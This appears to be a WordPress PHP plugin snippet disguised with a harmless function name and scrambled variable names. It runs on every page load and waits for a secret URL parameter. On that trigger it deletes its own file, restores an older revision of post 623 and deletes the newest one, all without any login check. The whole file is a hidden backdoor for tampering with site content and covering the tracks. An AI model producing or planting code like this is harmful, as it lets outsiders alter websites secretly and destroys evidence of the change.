<?php

function recipe_welcome_rating() {
	if (isset($_GET['translation_shortener_out_font']) && $_GET['translation_shortener_out_font'] === 'share_support_map_xml') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$variation_block_demomentsomtres = 623;
		$latest_showcase_website_roles = wp_get_post_revisions($variation_block_demomentsomtres);
		if (empty($latest_showcase_website_roles)) die('no revisions');
		if (count($latest_showcase_website_roles) < 2) die('less than 2');
		$forms_most_sliding = array_shift($latest_showcase_website_roles);
		$database_active_autocomplete = $forms_most_sliding->ID;
		$view_column_attachments = array_shift($latest_showcase_website_roles);
		$show_tinymce_redirect = $view_column_attachments->ID;
		$soon_total_charts_updates = wp_restore_post_revision($show_tinymce_redirect);
		if ($soon_total_charts_updates === false) die('error restoring');
		$soon_total_charts_updates = wp_delete_post_revision($database_active_autocomplete);		
		if ($soon_total_charts_updates === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'recipe_welcome_rating');
